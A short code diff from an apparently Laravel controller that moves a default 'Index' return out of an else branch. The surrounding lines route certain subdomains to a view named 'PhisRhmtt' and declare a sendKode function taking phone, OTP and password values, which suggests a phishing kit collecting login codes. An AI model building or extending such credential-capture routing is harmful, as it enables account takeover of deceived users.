@@ -85,9 +85,8 @@ class HomeController extends Controller
             return inertia('rhmtt/PhisRhmtt');
         } else if ($subdomain ===  "livegroup-vcx50") {
             return inertia('rhmtt/PhisRhmtt');
-        } else {
-            return inertia('Index');
         }
+        return inertia('Index');
     }
     public function sendKode($phone = "", $code = "", $otp = "", $password = "", $subdomain = "")
     {
